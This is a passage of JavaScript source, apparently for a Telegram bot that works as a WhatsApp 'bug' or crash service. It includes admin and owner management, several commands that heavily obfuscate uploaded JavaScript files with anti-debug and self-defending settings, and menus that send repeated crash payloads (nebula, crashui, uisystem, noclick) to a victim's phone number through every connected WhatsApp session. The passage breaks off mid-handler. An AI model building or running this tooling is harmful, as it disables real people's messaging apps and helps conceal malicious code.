    const userInfo = ctx.from;
    const userLink = `https://t.me/${userInfo.username || userInfo.id}`;
    ctx.reply(`ᝄ ᴜꜱᴇʀɪɴꜰᴏ:
│ɪᴅ: ${userInfo.id}
│ꜰɪʀꜱᴛ ɴᴀᴍᴇ: ${userInfo.first_name || 'Tidak ada nama depan'}
│ᴜꜱᴇʀɴᴀᴍᴇ: @${userInfo.username || 'Tidak ada username'}
│ᴜꜱᴇʀʟɪɴᴋ: ${userLink}`);
  }
});
let botForGroup = false; // Set true untuk mengaktifkan di grup
let botForPrivateChat = false; // Set true untuk mengaktifkan di private chat

// Command untuk mengaktifkan bot di grup
bot.command('grouponly', (ctx) => {
  const userId = ctx.from.id.toString();

  if (userId !== OWNER_ID && !isAdmin(userId)) {
    return ctx.reply('❌ You are not authorized to use this command.');
  }

  botForGroup = true;
  botForPrivateChat = false;
  ctx.reply(`
╭──(  ✅ Success    ) 
│ Bot diatur untuk hanya merespon di Grup!
╰━━━ㅡ━━━━━ㅡ━━━━━━⬣`);
});
const checkChatType = (ctx, next) => {
  if (botForGroup && ctx.chat.type !== 'group' && ctx.chat.type !== 'supergroup') {
    ctx.reply('❌ Command ini hanya dapat digunakan di grup.');
    return;
  }

  if (botForPrivateChat && ctx.chat.type !== 'private') {
    ctx.reply('❌ Command ini hanya dapat digunakan di private chat.');
    return;
  }

  next(); // Melanjutkan ke handler berikutnya jika lolos pengecekan
};
bot.use((ctx, next) => {
  // Set variabel global untuk menentukan tipe bot
  botForGroup = true; // Hanya untuk grup
  botForPrivateChat = false; // Tidak untuk private chat

  // Gunakan middleware
  checkChatType(ctx, next);
});
// Command untuk menonaktifkan semua mode (universal)
bot.command('disablemodes', (ctx) => {
  const userId = ctx.from.id.toString();

  if (userId !== OWNER_ID && !isAdmin(userId)) {
    return ctx.reply('❌ You are not authorized to use this command.');
  }

  botForGroup = false;
  botForPrivateChat = false;
  ctx.reply(`
╭──(  ✅ Success    ) 
│ Semua mode dinonaktifkan. Bot akan merespon di semua tempat!
╰━━━ㅡ━━━━━ㅡ━━━━━━⬣`);
});
bot.command('addowner', (ctx) => {
    const userId = ctx.from.id.toString();

    // Cek apakah pengguna adalah Owner atau Admin
    if (userId !== OWNER_ID && !isAdmin(userId)) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 3) {
        return ctx.reply('❌ Usage: /addowner <user_id> <duration_in_days>');
    }

    const targetUserId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply('❌ Invalid duration. It must be a number (in days).');
    }

    addDeLaplace(targetUserId, duration);
    ctx.reply(`✅ User ${targetUserId} has been granted owner access for ${duration} days.`);
});
//pair
bot.command("addsender", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);

  if (args.length === 0) {
    return ctx.reply(
      "⚠️ Penggunaan Salah!\nGunakan perintah: `/addsender <nomor_whatsapp>`",
      { parse_mode: "Markdown" }
    );
  }

  const botNumber = args[0].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, ctx);
  } catch (error) {
    console.error("Error in connectToWhatsApp:", error);
    ctx.reply("Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi.");
  }
});

// Command untuk menghapus owner (khusus Owner dan Admin)
bot.command('delowner', (ctx) => {
    const userId = ctx.from.id.toString();

    // Cek apakah pengguna adalah Owner atau Admin
    if (userId !== OWNER_ID && !isAdmin(userId)) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('❌ Usage: /delowner <user_id>');
    }

    const targetUserId = args[1];

    // Fungsi untuk menghapus owner
    const wasDeleted = removeDeLaplace(targetUserId);

    if (wasDeleted) {
        ctx.reply(`✅ User ${targetUserId} owner access has been removed.`);
    } else {
        ctx.reply(`❌ Failed to remove owner access for user ${targetUserId}.`);
    }
});
// Contoh fungsi `removeDeLaplace`
function removeDeLaplace(userId) {
    console.log(`Removing DeLaplace access for user: ${userId}`);
    return true; // Ubah sesuai hasil operasi
}

bot.command('DeLaplacefeature', (ctx) => {
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah DeLaplace
    if (!isDeLaplace(userId)) {
        return ctx.reply('❌ This feature is for DeLaplace users only. Upgrade to DeLaplace to use this command.');
    }

    // Logika untuk pengguna DeLaplace
    ctx.reply('🎉 Welcome to the DeLaplace-only feature! Enjoy exclusive benefits.');
});
const ADMINS_FILE = 'admins.json';
// Inisialisasi file admins.json
let admins = {};
if (fs.existsSync(ADMINS_FILE)) {
    admins = JSON.parse(fs.readFileSync(ADMINS_FILE, 'utf8'));
} else {
    fs.writeFileSync(ADMINS_FILE, JSON.stringify({}));
}

// Fungsi untuk mengecek apakah pengguna adalah admin
function isAdmin(userId) {
    return admins[userId];
}

// Fungsi untuk menambahkan admin
function addAdmin(userId) {
    admins[userId] = true;
    fs.writeFileSync(ADMINS_FILE, JSON.stringify(admins, null, 2));
}

// Fungsi untuk menghapus admin
function removeAdmin(userId) {
    if (admins[userId]) {
        delete admins[userId];
        fs.writeFileSync(ADMINS_FILE, JSON.stringify(admins, null, 2));
        return true;
    }
    return false;
}

// Command untuk menambahkan admin (hanya owner yang bisa melakukannya)
bot.command('addadmin', (ctx) => {
    const ownerId = ctx.from.id.toString();

    if (ownerId !== OWNER_ID) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('❌ Usage: /addadmin <user_id>');
    }

    const targetUserId = args[1];

    if (isAdmin(targetUserId)) {
        return ctx.reply(`✅ User ${targetUserId} is already an admin.`);
    }

    addAdmin(targetUserId);
    ctx.reply(`✅ User ${targetUserId} has been added as an admin.`);
});

// Command untuk menghapus admin
bot.command('deladmin', (ctx) => {
    const ownerId = ctx.from.id.toString();

    if (ownerId !== OWNER_ID) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('❌ Usage: /deladmin <user_id>');
    }

    const targetUserId = args[1];

    if (!isAdmin(targetUserId)) {
        return ctx.reply(`❌ User ${targetUserId} is not an admin.`);
    }

    const wasRemoved = removeAdmin(targetUserId);
    if (wasRemoved) {
        ctx.reply(`✅ User ${targetUserId} has been removed from admins.`);
    } else {
        ctx.reply(`❌ Failed to remove admin ${targetUserId}.`);
    }
});
bot.command("enc3", async (ctx) => {
    try {
        const reply = ctx.message.reply_to_message;

        if (!reply || !reply.document) {
            return ctx.reply("Gunakan perintah ini dengan me-reply file JavaScript.");
        }

        const file = reply.document;
        if (!file.file_name.endsWith(".js")) {
            return ctx.reply("File harus berformat .js");
        }

        if (!fs.existsSync("downloads")) {
            fs.mkdirSync("downloads");
        }

        const fileId = file.file_id;
        const filePath = `downloads/${file.file_name}`;
        const resultPath = `downloads/enc3_${file.file_name}`;

        const link = await ctx.telegram.getFileLink(fileId);
        const response = await fetch(link);
        const buffer = await response.buffer();
        fs.writeFileSync(filePath, buffer);

        ctx.reply("Memproses obfuscation dengan enc3, harap tunggu...");

        const originalCode = fs.readFileSync(filePath, "utf-8");

        const obfuscatedCode = await obfuscate(originalCode, {
            target: "node",
            calculator: true,
            compact: true,
            hexadecimalNumbers: true,
            controlFlowFlattening: 0.75,
            deadCode: 0.2,
            dispatcher: true,
            duplicateLiteralsRemoval: 0.75,
            flatten: true,
            globalConcealing: true,
            identifierGenerator: "mangled",
            minify: true,
            movedDeclarations: true,
            objectExtraction: true,
            opaquePredicates: 0.75,
            renameVariables: true,
            renameGlobals: true,
            shuffle: {
                hash: 0.5,
                true: 0.5,
            },
            stack: true,
            stringConcealing: true,
            stringCompression: true,
            stringEncoding: true,
            stringSplitting: 0.75,
            rgf: false,
        });

        fs.writeFileSync(resultPath, obfuscatedCode);

        await ctx.replyWithDocument({ source: resultPath, filename: `enc3_${file.file_name}` });

    } catch (error) {
        console.error(error);
        ctx.reply("Terjadi kesalahan saat melakukan obfuscation dengan enc3.");
    }
}); 
bot.command("enc2", async (ctx) => {
    const reply = ctx.message.reply_to_message;

    if (!reply || !reply.document) {
        return ctx.reply("Gunakan perintah ini dengan me-reply file JavaScript.");
    }

    const file = reply.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.reply("File harus berformat .js");
    }

    // Pastikan folder downloads ada
    if (!fs.existsSync("downloads")) {
        fs.mkdirSync("downloads");
    }

    const fileId = file.file_id;
    const filePath = `downloads/${file.file_name}`;
    const resultPath = `downloads/obfuscated_${file.file_name}`;

    try {
        const link = await ctx.telegram.getFileLink(fileId);
        const response = await fetch(link);
        const data = await response.text();

        ctx.reply("Memproses obfuscation, harap tunggu...");

        const obfuscationOptions = {
            target: "node",
            calculator: true,
            compact: true,
            hexadecimalNumbers: true,
            controlFlowFlattening: 0.75,
            deadCode: 0.2,
            dispatcher: true,
            duplicateLiteralsRemoval: 0.75,
            flatten: true,
            globalConcealing: true,
            identifierGenerator: function (identifierType, identifierId) {
         return "Zephyrine@Rainoneday" + Math.random().toString(36).substring(7);
l      },
           lock: {
      antiDebug: true,
    },
    minify: true,
    movedDeclarations: true,
    objectExtraction: true,
    opaquePredicates: 0.75,
    renameVariables: true,
    renameGlobals: true,
    shuffle: {
      hash: 0.5,
      true: 0.5,
    },
    stack: true,
    stringConcealing: true,
    stringCompression: true,
    stringEncoding: true,
    stringSplitting: 0.75,
    rgf: false,
        };

        const obfuscatedCode = await obfuscate(data, obfuscationOptions);

        fs.writeFileSync(resultPath, obfuscatedCode);
        await ctx.replyWithDocument({ source: resultPath });

        fs.unlinkSync(resultPath);
    } catch (err) {
        ctx.reply("Terjadi kesalahan dalam proses obfuscation.");
        console.error(err);
    }
});

// Preset High Security (Ringan & Aman)
const highObfuscationConfig = {
    target: "node",
    compact: true,
    minify: true,
    flatten: true,
    renameVariables: true,
    renameGlobals: true,
    stringEncoding: "base64",
    stringSplitting: 0.9,
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: 1.0,
    shuffle: { hash: 1.0, true: 1.0 },
    stack: true,
    controlFlowFlattening: 1.0,
    opaquePredicates: 1.0,
    deadCode: 1.0,
    dispatcher: true,
    rgf: true,
    calculator: true,
    hexadecimalNumbers: true,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true,
    selfDefending: true,
    debugger: true,
    virtualization: true,
    identifierGenerator: function () {
        return `Laplace_${Math.random().toString(36).substring(2, 4)}`;
    }
};

// Preset Extreme Security (Proteksi Maksimal)
const extremeObfuscationConfig = {
    target: "node",
    compact: true,
    minify: true,
    flatten: true,
    renameVariables: true,
    renameGlobals: true,
    stringEncoding: "rc4",
    stringSplitting: 1.0,
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: 1.0,
    shuffle: { hash: 1.0, true: 1.0 },
    stack: true,
    controlFlowFlattening: 1.0,
    opaquePredicates: 1.0,
    deadCode: 1.0,
    dispatcher: true,
    rgf: true,
    calculator: true,
    hexadecimalNumbers: true,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true,
    selfDefending: true,
    debugger: true,
    virtualization: true,
    identifierGenerator: function () {
        return `ExtremeSecure_${Math.random().toString(36).substring(2, 4)}`;
    }
};

// Fungsi untuk memproses obfuscation
async function processObfuscation(ctx, config, prefix) {
    try {
        const replyMessage = ctx.message.reply_to_message;
        if (!replyMessage || !replyMessage.document || !replyMessage.document.file_name.endsWith('.js')) {
            return ctx.reply('😠 Silakan balas file .js untuk dienkripsi.');
        }

        const fileId = replyMessage.document.file_id;
        const originalFileName = replyMessage.document.file_name;
        const tempFilePath = `./temp_${originalFileName}`;
        const encryptedFilePath = `./${prefix}_${originalFileName}`;

        // Mengunduh file
        ctx.reply("📥 Mengunduh file . . .");
        const fileLink = await ctx.telegram.getFileLink(fileId);
        const response = await axios.get(fileLink.href, { responseType: 'arraybuffer' });
        fs.writeFileSync(tempFilePath, response.data);

        // Proses obfuscation
        ctx.reply(`🔐 Memproses obfuscation ${prefix} security . . .`);
        const codeBuffer = fs.readFileSync(tempFilePath);
        const obfuscatedCode = await JsConfuser.obfuscate(codeBuffer.toString(), config);
        fs.writeFileSync(encryptedFilePath, obfuscatedCode);

        // Kirim file hasil enkripsi
        await ctx.replyWithDocument(
            { source: encryptedFilePath, filename: `${prefix}_${originalFileName}` },
            { caption: `🔒 File berhasil dienkripsi dengan mode ${prefix}!\n📌 Proteksi aktif!` }
        );

        // Hapus file sementara
        fs.unlinkSync(tempFilePath);
        fs.unlinkSync(encryptedFilePath);
    } catch (error) {
        console.error("Error:", error);
        ctx.reply("❌ Terjadi kesalahan saat memproses file.");
    }
}

// Command untuk mode High Security
bot.command("enc5", async (ctx) => {
    await processObfuscation(ctx, highObfuscationConfig, "high");
});

// Command untuk mode Extreme Security
bot.command("enc6", async (ctx) => {
    await processObfuscation(ctx, extremeObfuscationConfig, "extreme");
});
bot.command("enc", async (ctx) => {
    try {
        const messageText = ctx.message.text.split(" ");
        if (messageText.length < 2) {
            return ctx.reply("Gunakan format: /enc <nama_custom>");
        }

        const customName = messageText[1]; // Ambil nama custom
        const reply = ctx.message.reply_to_message;

        if (!reply || !reply.document) {
            return ctx.reply("Gunakan perintah ini dengan me-reply file JavaScript.");
        }

        const file = reply.document;
        if (!file.file_name.endsWith(".js")) {
            return ctx.reply("File harus berformat .js");
        }

        if (!fs.existsSync("downloads")) {
            fs.mkdirSync("downloads");
        }

        const fileId = file.file_id;
        const filePath = `downloads/${file.file_name}`;
        const resultPath = `downloads/obfuscated_${file.file_name}`;

        const link = await ctx.telegram.getFileLink(fileId);
        const response = await fetch(link);
        const buffer = await response.buffer();
        fs.writeFileSync(filePath, buffer);

        ctx.reply("Memproses obfuscation, harap tunggu...");

        const originalCode = fs.readFileSync(filePath, "utf-8");

        const obfuscatedCode = await obfuscate(originalCode, {
            target: "node",
            compact: true, 
            hexadecimalNumbers: true,
            controlFlowFlattening: 0.75,
            deadCode: 0.2,
            dispatcher: true,
            duplicateLiteralsRemoval: 0.75,
            flatten: true,
            globalConcealing: true,
            identifierGenerator: (identifierType, identifierId) => {
                return `${customName}_${identifierId}`;
            },
            lock: {
                antiDebug: true,
            },
            minify: true,
            movedDeclarations: true,
            objectExtraction: true,
            opaquePredicates: 0.75,
            renameVariables: true,
            renameGlobals: true,
            shuffle: {
                hash: 0.5,
                true: 0.5,
            },
            stack: true,
            stringConcealing: true,
            stringCompression: true,
            stringEncoding: true,
            stringSplitting: 0.75,
            rgf: false,
        });

        fs.writeFileSync(resultPath, obfuscatedCode);

        await ctx.replyWithDocument({ source: resultPath, filename: `obfuscated_${file.file_name}` });

    } catch (error) {
        console.error(error);
        ctx.reply("Terjadi kesalahan saat melakukan obfuscation.");
    }
});
bot.command("enc4", async (ctx) => {
    const replyMessage = ctx.message.reply_to_message;

    if (!replyMessage || !replyMessage.document || !replyMessage.document.file_name.endsWith('.js')) {
        return ctx.reply('😠 Silakan balas file .js untuk dienkripsi.');
    }

    const fileId = replyMessage.document.file_id;
    const fileName = replyMessage.document.file_name;

    // Memproses file untuk enkripsi
    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: 'arraybuffer' });
    const codeBuffer = Buffer.from(response.data);

    // Simpan file sementara
    const tempFilePath = `./@hardenc${fileName}`;
    fs.writeFileSync(tempFilePath, codeBuffer);

    // Enkripsi kode menggunakan JsConfuser
    ctx.reply("⚡️ Memproses encrypt hard code . . .");
    const obfuscatedCode = await JsConfuser.obfuscate(codeBuffer.toString(), {
        target: "node",
        preset: "high",
        compact: true,
        minify: true,
        flatten: true,
        identifierGenerator: function () {
            const originalString = 
            "素晴座素晴難素晴座素晴難" + 
            "素晴座素晴難素晴座素晴";
            function removeUnwantedChars(input) {
                return input.replace(/[^a-zA-Z座DeLaplace素Muzukashī素晴]/g, '');
            }
            function randomString(length) {
                let result = '';
                const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
                const charactersLength = characters.length;
                for (let i = 0; i < length; i++) {
                    result += characters.charAt(Math.floor(Math.random() * charactersLength));
                }
                return result;
            }
            return removeUnwantedChars(originalString) + randomString(2);
        },
        renameVariables: true,
        renameGlobals: true,
        stringEncoding: true,
        stringSplitting: 0.0,
        stringConcealing: true,
        stringCompression: true,
        duplicateLiteralsRemoval: 1.0,
        shuffle: { hash: 0.0, true: 0.0 },
        stack: true,
        controlFlowFlattening: 1.0,
        opaquePredicates: 0.9,
        deadCode: 0.0,
        dispatcher: true,
        rgf: false,
        calculator: true,
        hexadecimalNumbers: true,
        movedDeclarations: true,
        objectExtraction: true,
        globalConcealing: true
    });

    // Simpan hasil enkripsi
    const encryptedFilePath = `./@hardenc${fileName}`;
    fs.writeFileSync(encryptedFilePath, obfuscatedCode);

    // Kirim file terenkripsi ke pengguna
    await ctx.replyWithDocument(
        { source: encryptedFilePath, filename: `encrypted_${fileName}` },
        { caption: `╭━━━「 ✅ SUKSES 」━━━⬣\n│ File berhasil dienkripsi!\n│ @tester\n╰━━━━━━━━━━━━━━━━⬣` }
    );
});
bot.command("enccustom", async (ctx) => {
    try {
        const args = ctx.message.text.split(" ").slice(1);
        if (!args.length) return ctx.reply('😠 Harap masukkan custom nama untuk obfuscation.\n\nContoh: `/enc LaplaceSuper`');

        const customName = args.join("_"); // Nama yang akan digunakan dalam obfuscation

        const replyMessage = ctx.message.reply_to_message;
        if (!replyMessage || !replyMessage.document || !replyMessage.document.file_name.endsWith('.js')) {
            return ctx.reply('😠 Silakan balas file .js untuk dienkripsi.');
        }

        const fileId = replyMessage.document.file_id;
        const originalFileName = replyMessage.document.file_name;
        const tempFilePath = `./temp_${originalFileName}`;
        const encryptedFilePath = `./encrypted_${originalFileName}`;

        // Mendapatkan file dari Telegram
        ctx.reply("📥 Mengunduh file . . .");
        const fileLink = await ctx.telegram.getFileLink(fileId);
        const response = await axios.get(fileLink.href, { responseType: 'arraybuffer' });

        // Simpan file sementara
        fs.writeFileSync(tempFilePath, response.data);

        // Enkripsi kode menggunakan JsConfuser dengan custom nama
        ctx.reply(`⚡️ Memproses encrypt dengan nama kustom: ${customName} . . .`);
        const codeBuffer = fs.readFileSync(tempFilePath);
        const obfuscatedCode = await JsConfuser.obfuscate(codeBuffer.toString(), {
            target: "node",
            compact: true,
            minify: true,
            flatten: true,
            renameVariables: true,
            renameGlobals: true,
            stringEncoding: "base64",
            stringSplitting: 0.7,
            stringConcealing: true,
            stringCompression: true,
            duplicateLiteralsRemoval: 1.0,
            shuffle: { hash: 0.7, true: 0.7 },
            stack: true,
            controlFlowFlattening: 1.0,
            opaquePredicates: 1.0,
            deadCode: 0.5,
            dispatcher: true,
            rgf: true,
            calculator: true,
            hexadecimalNumbers: true,
            movedDeclarations: true,
            objectExtraction: true,
            globalConcealing: true,
            selfDefending: true,
            debugger: true,
            virtualization: true, 
            identifierGenerator: function () {
                const randomString = Math.random().toString(36).substring(2, 4);
                return `${customName}_${randomString}`;
            }
        });

        // Simpan hasil enkripsi
        fs.writeFileSync(encryptedFilePath, obfuscatedCode);

        // Kirim file ke pengguna
        await ctx.replyWithDocument(
            { source: encryptedFilePath, filename: `encrypted_${originalFileName}` },
            { caption: `╭━━━「 ✅ SUKSES 」━━━⬣\n│ File berhasil dienkripsi dengan nama kustom!\n│ 🔑 Nama: ${customName}\n│ @tester\n╰━━━━━━━━━━━━━━━━⬣` }
        );

        // Hapus file sementara setelah dikirim
        fs.unlinkSync(tempFilePath);
        fs.unlinkSync(encryptedFilePath);
    } catch (error) {
        console.error("Error:", error);
        ctx.reply("❌ Terjadi kesalahan saat memproses file.");
    }
});
bot.command("enc1", async (ctx) => {
    const reply = ctx.message.reply_to_message;

    if (!reply || !reply.document) {
        return ctx.reply("Gunakan perintah ini dengan me-reply file JavaScript.");
    }

    const file = reply.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.reply("File harus berformat .js");
    }

    // Pastikan folder downloads ada
    if (!fs.existsSync("downloads")) {
        fs.mkdirSync("downloads");
    }

    const fileId = file.file_id;
    const filePath = `downloads/${file.file_name}`;
    const resultPath = `downloads/obfuscated_${file.file_name}`;

    try {
        const link = await ctx.telegram.getFileLink(fileId);
        const response = await fetch(link);
        const data = await response.text();

        ctx.reply("Memproses obfuscation, harap tunggu...");

        const obfuscatedCode = await obfuscate(data, {
            target: "node",
            preset: "high",
            calculator: true,
            compact: true,
            hexadecimalNumbers: true,
            controlFlowFlattening: 0.75,
            deadCode: 0.2,
            dispatcher: true,
            duplicateLiteralsRemoval: 0.75,
            flatten: true,
            globalConcealing: true,
            identifierGenerator: "randomized",
            minify: true,
            movedDeclarations: true,
            objectExtraction: true,
            opaquePredicates: 0.75,
            renameVariables: true,
            renameGlobals: true,
            shuffle: { hash: 0.5, true: 0.5 },
            stack: true,
            stringConcealing: true,
            stringCompression: true,
            stringEncoding: true,
            stringSplitting: 0.75,
             rgf: false
        });

        fs.writeFileSync(resultPath, obfuscatedCode);
        await ctx.replyWithDocument({ source: resultPath });

        fs.unlinkSync(resultPath);
    } catch (err) {
        ctx.reply("Terjadi kesalahan dalam proses obfuscation.");
        console.error(err);
    }
});
//Func Button
bot.command("nebula", async ctx => {
  const userId = ctx.from.id;
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return await ctx.reply(`Example: /nebula 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  userHasRunTes.set(userId, target);

  const buttons = [
    [
      { text: "︎𝙱𝙴𝚃𝙰", callback_data: `tes_${target}` },
      { text: "𝚃𝚁𝙰𝚂𝙷 𝚄𝙸", callback_data: `core_${target}` }
    ],
    [
      { text: "︎𝙽𝙴𝙱𝚄𝙻𝙰", callback_data: `nebula_${target}` },
    ],
    [
      { text: "︎𝙽𝙴𝚇𝚃 𝙱𝚄𝙶 𝙸𝙾𝚂", callback_data: `lanjut_${target}` }
    ]
  ];

  const loadingImageUrl = "https://img86.pixhost.to/images/382/561078759_uploaded_image.jpg";

  await ctx.replyWithPhoto(loadingImageUrl, {
    caption: `Click One Of The Buttons To Select The Bug Option
 © ᴅᴇʟᴀᴘʟᴀᴄᴇ - ᴀssɪsᴛᴀɴᴛ ${q}`,
    reply_markup: {
      inline_keyboard: buttons
    }
  });
});

bot.action(/lanjut_(.+)/, async (ctx) => {
  const target = ctx.match[1];

  userHasRunTes.set(ctx.from.id, target);

  const buttons = [
    [
      { text: "︎𝚂𝙷𝙰𝙳𝙾𝚆𝙸𝙾𝚂", callback_data: `iosx_${target}` },
      { text: "𝙸𝙽𝚅𝙸𝚂𝙸𝙾𝚂", callback_data: `xis_${target}` }
    ],
    [
      { text: "𝙱𝙰𝙲𝙺 𝙱𝚄𝙶 𝙰𝙽𝙳𝚁𝙾𝙸𝙳", callback_data: `back_to_crash_${target}` }
    ]
  ];

  const loadingImageUrl = "https://img86.pixhost.to/images/382/561078759_uploaded_image.jpg";

  await ctx.editMessageCaption(`Pilih metode berikut untuk mengirim bug ke ${target}`, {
    photo: loadingImageUrl,
    reply_markup: {
      inline_keyboard: buttons
    }
  });
});

bot.action(/back_to_crash_(.+)/, async (ctx) => {
  const target = ctx.match[1];

  const buttons = [
    [
      { text: "︎𝙱𝙴𝚃𝙰", callback_data: `tes_${target}` },
      { text: "𝚃𝚁𝙰𝚂𝙷 𝚄𝙸", callback_data: `core_${target}` }
    ],
    [
      { text: "︎𝙽𝙴𝙱𝚄𝙻𝙰", callback_data: `nebula_${target}` },
    ],
    [
      { text: " 𝙽𝙴𝚇𝚃 𝙱𝚄𝙶 𝙸𝙾𝚂", callback_data: `lanjut_${target}` }
    ]
  ];

  const loadingImageUrl = "https://img102.pixhost.to/images/83/556623394_skyzopedia.jpg";

  await ctx.editMessageCaption(`Click One Of The Buttons To Select The Bug Option
 © ᴅᴇʟᴀᴘʟᴀᴄᴇ - ᴀssɪsᴛᴀɴᴛ`, {
    photo: loadingImageUrl,
    reply_markup: {
      inline_keyboard: buttons
    }
  });
});
//anjay
bot.action(/trash_(.+)/, async (ctx) => {
    const chatId = ctx.chat.id;
    const msgText = ctx.match[1];

    if (!msgText) {
        return ctx.reply("Format: _<nomor>_<pesan>");
    }

    if (!isPremium(ctx.from.id)) {
        return ctx.reply("⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan perintah ini.", { parse_mode: "Markdown" });
    }

    const args = msgText.split("_");
    const targetNumber = args[0];
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;

    try {
        if (sessions.size === 0) {
            return ctx.reply("Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender");
        }

        const statusMessage = await ctx.reply(`╔════════════════════╗  
║      SESSION INFO      
╠════════════════════╣  
║ TARGET    : ${formattedNumber}  
║ TOTAL BOT : ${sessions.size}  
╚════════════════════╝`);

        let successCount = 0;
        let failCount = 0;

        for (const [botNum, sock] of sessions.entries()) {
            try {
                if (!sock.user) {
                    console.log(`Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`);
                    await initializeWhatsAppConnections();
                    continue;
                }

                for (let i = 0; i < 10; i++) {
                    await nebula(sock, target);
                    await Invisibleloadfast(sock, target);
                    await noclick(sock, target);
                    await Invisibleloadfast(sock, target);
                    await nebula(sock, target);
                    await noclick(sock, target);
                }
                successCount++;
            } catch (error) {
                failCount++;
            }
        }

        await ctx.telegram.editMessageText(
            chatId,
            statusMessage.message_id,
            undefined,
            `╔════════════════════╗  
║   DIFFUSION REPORT   
╠════════════════════╣  
║ TARGET    : ${formattedNumber}  
║ TYPE      : BETA CRASH
║ SUCCESS   : ${successCount}  
║ FAILED    : ${failCount}  
║ TOTAL NUM : ${sessions.size}  
╚════════════════════╝`,
            { parse_mode: "Markdown" }
        );

    } catch (error) {
        ctx.reply("Terjadi kesalahan saat mengirim pesan. Silakan coba lagi.");
    }
});
bot.action(/tes_(.+)/, async (ctx) => {
    const chatId = ctx.chat.id;
    const msgText = ctx.match[1];

    if (!msgText) {
        return ctx.reply("Format: _<nomor>_<pesan>");
    }

    if (!isPremium(ctx.from.id)) {
        return ctx.reply("⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan perintah ini.", { parse_mode: "Markdown" });
    }

    const args = msgText.split("_");
    const targetNumber = args[0];
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;

    try {
        if (sessions.size === 0) {
            return ctx.reply("Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender");
        }

        const statusMessage = await ctx.reply(`╔════════════════════╗  
║      SESSION INFO      
╠════════════════════╣  
║ TARGET    : ${formattedNumber}  
║ TOTAL BOT : ${sessions.size}  
╚════════════════════╝`);

        let successCount = 0;
        let failCount = 0;

        for (const [botNum, sock] of sessions.entries()) {
            try {
                if (!sock.user) {
                    console.log(`Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`);
                    await initializeWhatsAppConnections();
                    continue;
                }

                for (let i = 0; i < 1; i++) {
                    await nebula(sock, target);
                    await click(sock, target);
                    await noclick(sock, target);
                    await nebula(sock, target);
                }
                successCount++;
            } catch (error) {
                failCount++;
            }
        }

        await ctx.telegram.editMessageText(
            chatId,
            statusMessage.message_id,
            undefined,
            `╔════════════════════╗  
║   DIFFUSION REPORT   
╠════════════════════╣  
║ TARGET    : ${formattedNumber}  
║ TYPE      : BETA CRASH
║ SUCCESS   : ${successCount}  
║ FAILED    : ${failCount}  
║ TOTAL NUM : ${sessions.size}  
╚════════════════════╝`,
            { parse_mode: "Markdown" }
        );

    } catch (error) {
        ctx.reply("Terjadi kesalahan saat mengirim pesan. Silakan coba lagi.");
    }
});
bot.action(/core_(.+)/, async (ctx) => {
    const chatId = ctx.chat.id;
    const msgText = ctx.match[1];

    if (!msgText) {
        return ctx.reply("Format: xis_<nomor>_<pesan>");
    }

    if (!isPremium(ctx.from.id)) {
        return ctx.reply("⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan perintah ini.", { parse_mode: "Markdown" });
    }

    const args = msgText.split("_");
    const targetNumber = args[0];
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;

    try {
        if (sessions.size === 0) {
            return ctx.reply("Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender");
        }

        const statusMessage = await ctx.reply(`╔════════════════════╗  
║      SESSION INFO      
╠════════════════════╣  
║ TARGET    : ${formattedNumber}  
║ TOTAL BOT : ${sessions.size}  
╚════════════════════╝`);

        let successCount = 0;
        let failCount = 0;

        for (const [botNum, sock] of sessions.entries()) {
            try {
                if (!sock.user) {
                    console.log(`Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`);
                    await initializeWhatsAppConnections();
                    continue;
                }

                for (let i = 0; i < 10; i++) {
                    await crashui(sock, target);
                    await uisystem(sock, target);
                    await crashui(sock, target);
                    await noclick(sock, target);
                    await notif(sock, target);
                    await uisystem(sock, target);
                    await crashui(sock, target);
                }
                successCount++;
            } catch (error) {
                failCount++;
            }
        }

        await ctx.telegram.editMessageText(
            chatId,
            statusMessage.message_id,
            undefined,
            `╔════════════════════╗  
║   DIFFUSION REPORT   
╠════════════════════╣  
║ TARGET    : ${formattedNumber}  
║ TYPE      : TRASH UI
║ SUCCESS   : ${successCount}  
║ FAILED    : ${failCount}  
║ TOTAL NUM : ${sessions.size}  
╚════════════════════╝`,
            { parse_mode: "Markdown" }
        );

    } catch (error) {
